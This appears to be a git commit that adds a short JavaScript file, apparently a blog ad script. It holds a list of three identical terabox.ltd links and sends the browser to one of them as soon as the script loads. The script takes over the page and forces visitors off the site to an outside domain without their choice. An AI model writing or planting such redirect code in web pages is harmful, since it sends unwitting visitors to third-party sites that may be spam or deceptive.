4464f05a0307da03ca850320b2c9152fe8b249bd
Jamawe12 <93462207+Jamawe12@users.noreply.github.com>
2025-08-06 00:18:42 +0700

    Create aaablogadse1.js

---
+++ aaablogadse1.js
@@ -0,0 +1,11 @@
+var dataUrl = [
+
+  'https://terabox.ltd/8Ew3sze1DeKR441gJdju4n',
+
+  'https://terabox.ltd/8Ew3sze1DeKR441gJdju4n',
+
+  'https://terabox.ltd/8Ew3sze1DeKR441gJdju4n'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
